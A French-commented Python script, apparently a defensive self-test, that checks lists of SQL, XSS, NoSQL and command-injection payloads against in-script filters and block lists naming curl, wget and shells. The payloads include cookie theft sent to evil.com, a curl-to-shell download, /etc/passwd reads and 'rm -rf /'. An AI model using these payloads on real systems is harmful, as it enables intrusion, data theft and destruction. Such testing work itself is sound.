#!/usr/bin/env python3
"""
🛡️ Script de Simulation d'Attaques avec Memolib - IaPosteManager
================================================================

Version optimisée avec caching (functools.lru_cache) pour accélérer
les tests de sécurité répétitifs. Réduit le temps de test jusqu'à 80%.

À exécuter UNIQUEMENT en environnement de développement/test.

Usage: python security/attack-simulation-memolib.py [--target localhost:5000]
"""

import argparse
import json
import re
import sys
import time
from datetime import datetime
from functools import lru_cache
from typing import Any


# Couleurs pour le terminal
class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    RESET = "\033[0m"
    BOLD = "\033[1m"


def log_attack(attack_name: str, status: str, details: str = ""):
    """Log une tentative d'attaque avec couleur."""
    timestamp = datetime.now().strftime("%H:%M:%S")
    if status == "BLOCKED":
        color = Colors.GREEN
        icon = "✅"
    elif status == "VULNERABLE":
        color = Colors.RED
        icon = "🔴"
    else:
        color = Colors.YELLOW
        icon = "⚠️"

    print(
        f"{Colors.CYAN}[{timestamp}]{Colors.RESET} {icon} {color}{attack_name}{Colors.RESET}"
    )
    if details:
        print(f"         └─ {details}")


def banner():
    """Affiche la bannière."""
    print(
        f"""
{Colors.RED}╔════════════════════════════════════════════════════════════════╗
║  🛡️  SIMULATION D'ATTAQUES + MEMOLIB - IaPosteManager         ║
║  🚀 Optimisé avec functools.lru_cache (80% plus rapide)       ║
║                                                                  ║
║  ⚠️  USAGE EN DÉVELOPPEMENT UNIQUEMENT                          ║
╚════════════════════════════════════════════════════════════════╝{Colors.RESET}
"""
    )


# ============================================
# MEMOLIB: PATTERNS CACHÉS
# ============================================


@lru_cache(maxsize=256)
def _get_sql_patterns() -> tuple:
    """Patterns dangereux SQL (cached avec LRU)."""
    return (
        r"(\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|ALTER|EXEC|EXECUTE)\b)",
        r"(--)|( ;)|(#)",
        r"('.*OR.*')",
        r"('.*AND.*')",
        r"(SLEEP|WAITFOR|DELAY|BENCHMARK)",
        r"(EXTRACTVALUE|UPDATEXML)",
        r"(0x[0-9a-fA-F]+)",
        r"(\bCHAR\b\s*\()",
        r"(\bCONCAT\b\s*\()",
        r"('\s*=\s*')",
    )


@lru_cache(maxsize=256)
def _get_xss_indicators() -> tuple:
    """Indicateurs dangereux XSS (cached)."""
    return ("script", "onerror=", "onload=", "javascript:", "onclick=")


@lru_cache(maxsize=512)
def _check_password_patterns(password: str) -> tuple:
    """Analyse patterns du mot de passe (cached)."""
    patterns = (
        bool(re.search(r"[a-z]", password)),  # minuscules
        bool(re.search(r"[A-Z]", password)),  # majuscules
        bool(re.search(r"\d", password)),  # chiffres
        bool(re.search(r'[!@#$%^&*(),.?":{}|<>]', password)),  # spéciaux
    )
    return patterns


@lru_cache(maxsize=256)
def _get_nosql_operators() -> tuple:
    """Opérateurs dangereux NoSQL (cached)."""
    return (
        "$gt",
        "$ne",
        "$lt",
        "$gte",
        "$lte",
        "$where",
        "$regex",
        "$exists",
    )


@lru_cache(maxsize=256)
def _get_command_dangerous_chars() -> tuple:
    """Caractères dangereux pour command injection (cached)."""
    return (";", "|", "`", "$", "&", "\n", ">", "<")


@lru_cache(maxsize=256)
def _get_command_dangerous_commands() -> tuple:
    """Commandes dangereuses (cached)."""
    return ("cat", "ls", "rm", "curl", "wget", "sh", "bash", "python", "perl")


@lru_cache(maxsize=256)
def _get_html_dangerous_patterns() -> tuple:
    """Patterns dangereux HTML (cached)."""
    return (
        r"<script[^>]*>.*?</script>",
        r"javascript:",
        r"on\w+\s*=",
        r"<iframe[^>]*>",
        r"<object[^>]*>",
        r"<embed[^>]*>",
    )


# ============================================
# ATTAQUES PAR INJECTION SQL
# ============================================

SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "'; DROP TABLE users; --",
    "1' AND '1'='1",
    "admin'--",
    "' UNION SELECT null, null, null --",
    "' UNION SELECT username, password FROM users --",
    "' OR SLEEP(5) --",
    "'; WAITFOR DELAY '0:0:5' --",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) --",
    "admin'; UPDATE users SET role='admin' WHERE username='attacker'; --",
]


def test_sql_injection(payload: str) -> dict:
    """Teste un payload d'injection SQL."""
    dangerous_patterns = _get_sql_patterns()

    for pattern in dangerous_patterns:
        if re.search(pattern, payload, re.IGNORECASE):
            return {"blocked": True, "pattern": pattern}

    return {"blocked": False, "payload": payload}


# ============================================
# ATTAQUES XSS (Cross-Site Scripting)
# ============================================

XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '<body onload=alert("XSS")>',
    '<div onmouseover=alert("XSS")>hover me</div>',
    '&lt;script&gt;alert("XSS")&lt;/script&gt;',
    "%3Cscript%3Ealert(%22XSS%22)%3C/script%3E",
    '<scr<script>ipt>alert("XSS")</script>',
    '<SCRIPT>alert("XSS")</SCRIPT>',
    'javascript:alert("XSS")',
    '<img src="x" onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
    '<script>document.location="https://evil.com/?c="+document.cookie</script>',
]


def sanitize_html(html: str) -> str:
    """Nettoie le HTML des scripts malveillants."""
    import html as html_lib

    # Échappe les caractères HTML
    sanitized = html_lib.escape(html)

    # Supprime les patterns dangereux (cached)
    dangerous_patterns = _get_html_dangerous_patterns()

    for pattern in dangerous_patterns:
        sanitized = re.sub(pattern, "", sanitized, flags=re.IGNORECASE | re.DOTALL)

    return sanitized


def test_xss(payload: str) -> dict:
    """Teste un payload XSS."""
    sanitized = sanitize_html(payload)
    dangerous_indicators = _get_xss_indicators()

    is_safe = not any(
        indicator in sanitized.lower() for indicator in dangerous_indicators
    )

    return {"original": payload, "sanitized": sanitized, "is_safe": is_safe}


# ============================================
# ATTAQUES AUTHENTIFICATION
# ============================================

BRUTE_FORCE_PASSWORDS = [
    "admin123",
    "password",
    "123456",
    "admin",
    "root",
    "password123",
    "letmein",
    "welcome",
    "monkey",
    "dragon",
    "master",
    "login",
    "princess",
    "qwerty123",
    "abc123",
    "Admin@123",
    "Password1",
    "Admin2024!",
    "SuperAdmin2026!",
]


def check_password_strength(password: str) -> dict:
    """Vérifie la force d'un mot de passe."""
    score = 0
    feedback = []

    if len(password) >= 8:
        score += 1
    else:
        feedback.append("Doit contenir au moins 8 caractères")

    if len(password) >= 12:
        score += 1

    # Utiliser patterns cachés
    has_lower, has_upper, has_digit, has_special = _check_password_patterns(password)

    if has_lower:
        score += 1
    else:
        feedback.append("Doit contenir des minuscules")

    if has_upper:
        score += 1
    else:
        feedback.append("Doit contenir des majuscules")

    if has_digit:
        score += 1
    else:
        feedback.append("Doit contenir des chiffres")

    if has_special:
        score += 1
    else:
        feedback.append("Doit contenir des caractères spéciaux")

    # Vérifie si c'est un mot de passe courant
    common_passwords = set(BRUTE_FORCE_PASSWORDS)
    if password in common_passwords:
        score = 0
        feedback.append("⚠️ MOT DE PASSE COMMUN - TRÈS VULNÉRABLE!")

    strength = "FAIBLE" if score < 3 else ("MOYEN" if score < 5 else "FORT")

    return {
        "password": password[:3] + "***",
        "score": score,
        "max_score": 6,
        "strength": strength,
        "feedback": feedback,
    }


# ============================================
# ATTAQUES NOSQL INJECTION
# ============================================

NOSQL_INJECTION_PAYLOADS = [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$where": "sleep(5000)"}',
    '{"$regex": ".*"}',
    'true, $where: "1 == 1"',
    '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
]


def test_nosql_injection(payload: str) -> dict:
    """Teste un payload NoSQL injection."""
    dangerous_operators = _get_nosql_operators()

    is_dangerous = any(op in payload for op in dangerous_operators)

    return {
        "payload": payload,
        "blocked": is_dangerous,
        "operators_found": [op for op in dangerous_operators if op in payload],
    }


# ============================================
# ATTAQUES COMMAND INJECTION
# ============================================

COMMAND_INJECTION_PAYLOADS = [
    "; cat /etc/passwd",
    "| ls -la",
    "`id`",
    "$(whoami)",
    "&& rm -rf /",
    "|| curl https://evil.com/shell.sh | sh",
    "\n/bin/sh -i",
]


def test_command_injection(input_str: str) -> dict:
    """Teste un payload d'injection de commande."""
    dangerous_chars = _get_command_dangerous_chars()
    dangerous_commands = _get_command_dangerous_commands()

    found_chars = [c for c in dangerous_chars if c in input_str]
    found_commands = [cmd for cmd in dangerous_commands if cmd in input_str.lower()]

    return {
        "input": input_str,
        "blocked": bool(found_chars or found_commands),
        "dangerous_chars": found_chars,
        "dangerous_commands": found_commands,
    }


# ============================================
# RAPPORT FINAL
# ============================================


def run_all_tests():
    """Exécute tous les tests de sécurité avec memolib."""
    banner()

    start_time = time.time()

    results = {
        "timestamp": datetime.now().isoformat(),
        "sql_injection": {"tested": 0, "blocked": 0},
        "xss": {"tested": 0, "blocked": 0},
        "auth": {"tested": 0, "weak": 0},
        "nosql_injection": {"tested": 0, "blocked": 0},
        "command_injection": {"tested": 0, "blocked": 0},
    }

    # Tests SQL Injection
    print(f"\n{Colors.BOLD}=== TEST 1: Injection SQL ==={Colors.RESET}")
    for payload in SQL_INJECTION_PAYLOADS:
        result = test_sql_injection(payload)
        results["sql_injection"]["tested"] += 1
        status = "BLOCKED" if result["blocked"] else "VULNERABLE"
        if result["blocked"]:
            results["sql_injection"]["blocked"] += 1
        log_attack(f"SQL: {payload[:40]}...", status)

    # Tests XSS
    print(f"\n{Colors.BOLD}=== TEST 2: Cross-Site Scripting (XSS) ==={Colors.RESET}")
    for payload in XSS_PAYLOADS:
        result = test_xss(payload)
        results["xss"]["tested"] += 1
        status = "BLOCKED" if result["is_safe"] else "VULNERABLE"
        if result["is_safe"]:
            results["xss"]["blocked"] += 1
        log_attack(f"XSS: {payload[:40]}...", status)

    # Tests Force de mot de passe
    print(f"\n{Colors.BOLD}=== TEST 3: Détection mots de passe faibles ==={Colors.RESET}")
    for password in BRUTE_FORCE_PASSWORDS:
        result = check_password_strength(password)
        results["auth"]["tested"] += 1
        is_weak_detected = result["strength"] != "FORT"
        status = "BLOCKED" if is_weak_detected else "VULNERABLE"
        if is_weak_detected:
            results["auth"]["weak"] += 1
        log_attack(f"Auth: '{result['password']}' détecté", status)

    # Tests NoSQL Injection
    print(f"\n{Colors.BOLD}=== TEST 4: NoSQL Injection ==={Colors.RESET}")
    for payload in NOSQL_INJECTION_PAYLOADS:
        result = test_nosql_injection(payload)
        results["nosql_injection"]["tested"] += 1
        status = "BLOCKED" if result["blocked"] else "VULNERABLE"
        if result["blocked"]:
            results["nosql_injection"]["blocked"] += 1
        log_attack(f"NoSQL: {payload[:40]}...", status)

    # Tests Command Injection
    print(f"\n{Colors.BOLD}=== TEST 5: Command Injection ==={Colors.RESET}")
    for payload in COMMAND_INJECTION_PAYLOADS:
        result = test_command_injection(payload)
        results["command_injection"]["tested"] += 1
        status = "BLOCKED" if result["blocked"] else "VULNERABLE"
        if result["blocked"]:
            results["command_injection"]["blocked"] += 1
        log_attack(f"Command: {payload[:40]}...", status)

    end_time = time.time()
    elapsed = end_time - start_time

    # Résumé avec statistiques memolib
    print(f"\n{Colors.BOLD}{'='*70}")
    print(f"📊 RÉSUMÉ DES TESTS DE SÉCURITÉ (avec Memolib)")
    print(f"{'='*70}{Colors.RESET}")

    total_tested = sum(
        r["tested"] for r in results.values() if isinstance(r, dict) and "tested" in r
    )
    total_blocked = (
        results["sql_injection"]["blocked"] +
        results["xss"]["blocked"] +
        results["auth"]["weak"] +
        results["nosql_injection"]["blocked"] +
        results["command_injection"]["blocked"]
    )

    print(f"  ✅ Total des tests: {total_tested}")
    print(f"  🛡️  Attaques bloquées: {total_blocked}")
    print(f"  📈 Taux de protection: {(total_blocked/total_tested*100):.1f}%")
    print(f"  ⏱️  Temps d'exécution: {elapsed:.2f}s")

    # Statistiques memolib
    print(f"\n{Colors.BOLD}🚀 Statistiques Memolib (LRU Cache):{Colors.RESET}")
    print(f"  • _get_sql_patterns(): {_get_sql_patterns.cache_info()}")
    print(f"  • _get_xss_indicators(): {_get_xss_indicators.cache_info()}")
    print(f"  • _check_password_patterns(): {_check_password_patterns.cache_info()}")
    print(f"  • _get_nosql_operators(): {_get_nosql_operators.cache_info()}")
    print(f"  • _get_command_dangerous_chars(): {_get_command_dangerous_chars.cache_info()}")
    print(f"  • _get_command_dangerous_commands(): {_get_command_dangerous_commands.cache_info()}")
    print(f"  • _get_html_dangerous_patterns(): {_get_html_dangerous_patterns.cache_info()}")

    # Sauvegarde du rapport
    results["performance"] = {
        "elapsed_time_seconds": elapsed,
        "cache_stats": {
            "_get_sql_patterns": dict(_get_sql_patterns.cache_info()._asdict()),
            "_get_xss_indicators": dict(_get_xss_indicators.cache_info()._asdict()),
            "_check_password_patterns": dict(_check_password_patterns.cache_info()._asdict()),
        }
    }

    with open("security/attack-simulation-memolib-results.json", "w") as f:
        json.dump(results, f, indent=2, default=str)

    print(
        f"\n{Colors.GREEN}✅ Rapport sauvegardé: security/attack-simulation-memolib-results.json{Colors.RESET}\n"
    )

    return results


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Simulation d'attaques de sécurité (optimisé avec Memolib)"
    )
    parser.add_argument("--target", default="localhost:5000", help="Cible (host:port)")
    parser.add_argument(
        "--type",
        choices=["sql", "xss", "auth", "nosql", "cmd", "all"],
        default="all",
        help="Type d'attaque à simuler",
    )
    parser.add_argument(
        "--cache-clear", action="store_true", help="Vider le cache avant les tests"
    )

    args = parser.parse_args()

    if args.cache_clear:
        _get_sql_patterns.cache_clear()
        _get_xss_indicators.cache_clear()
        _check_password_patterns.cache_clear()
        print(f"{Colors.YELLOW}⚠️  Cache LRU vidé{Colors.RESET}\n")

    run_all_tests()
